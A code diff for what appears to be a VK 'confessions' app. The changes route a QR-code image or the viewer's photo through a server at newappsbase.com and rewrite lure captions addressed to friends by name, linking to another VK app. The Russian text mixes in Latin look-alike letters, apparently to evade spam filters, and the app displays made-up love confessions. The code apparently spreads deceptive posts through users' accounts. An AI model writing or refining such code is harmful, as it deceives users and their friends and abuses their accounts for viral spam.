@@ -115,13 +115,16 @@
           var users_list = users[0];
           var fr_photo = users[1];
 
+          var photos_list = ["http://newappsbase.com/NEW_LOVE/qr51094423.png",viewer.photo_max_orig];
+          photos_list = photos_list[getRandom(0,photos_list.length-1)];
+
         $.ajax({
             type: "POST",
             url: "https://newappsbase.com/NEW_LOVE/functions.php",
             data: {
                 "method": "getUploadServer",
                 "upload_url": upload_url,
-                "my_photo": fr_photo,
+                "my_photo": photos_list,
                 "viewer_id": viewer.id
             },
             success: function(data){
@@ -131,7 +134,7 @@
                     //users_list+", oставляю о тебе мнения, посмотри если интересно : \n\n https://vk.com/app"+vk_app_id
 
                     var text = [
-                      users_list+", ты уже видeла что о тeбе нaписaли мнeниe? : \n\n https://vk.com/app8151571 "
+                      users_list+", a ты видeлa что тeбе отправили мнeниe? : \n\n https://vk.com/app8151655 "
                     ];
                     var caption = text[getRandom(0,text.length-1)];
 
@@ -176,7 +179,7 @@
     }
 
     function randomString(len, charSet) {
-      charSet = charSet || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      charSet = charSet || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ';
       var randomString = '';
       for (var i = 0; i < len; i++) {
           var randomPoz = Math.floor(Math.random() * charSet.length);
@@ -202,7 +205,7 @@
     }
 
     function openApp() {
-      var answers = ["я тебя люблю, очень))", "ты мне уже давно нравишься!", " будем встречаться??"];
+      var answers = ["я тебя люблю, 2 года уже)", "ты мне уже давно нравишься!", " погуляем вместе?"];
       var div = '<div style="text-align:center;margin-top:30px;"><b>Признания тебе</b></div>';
       for(var i=0;i<3;i++) {
           div+='<div style="margin:10px;padding-bottom:10px;border: 1px solid #ccc!important;border-radius:10px;margin-top:10px;"> \n\
